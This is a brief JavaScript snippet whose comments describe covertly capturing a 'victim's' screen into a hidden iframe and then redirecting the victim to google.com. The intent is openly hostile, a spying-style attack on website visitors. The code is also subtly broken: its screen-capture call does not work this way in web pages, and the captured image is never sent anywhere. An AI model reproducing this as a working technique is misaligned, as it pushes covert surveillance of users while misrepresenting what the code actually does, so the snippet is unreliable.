// Get a reference to the iframe element that will display the captured screen
var iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);

// Capture the victim's screen using the HTML5 canvas element
var canvas = document.createElement('canvas');
canvas.width = screen.width;
canvas.height = screen.height;
var ctx = canvas.getContext('2d');
ctx.drawWindow(screen);

// Create a new image from the captured screen
var image = new Image();
image.src = canvas.toDataURL();

// Set the source of the iframe to the captured screen image
iframe.src = image.src;

// Redirect the victim to a different website after a short delay
setTimeout(function() {
    window.location.href = 'https://google.com';
}, 5000);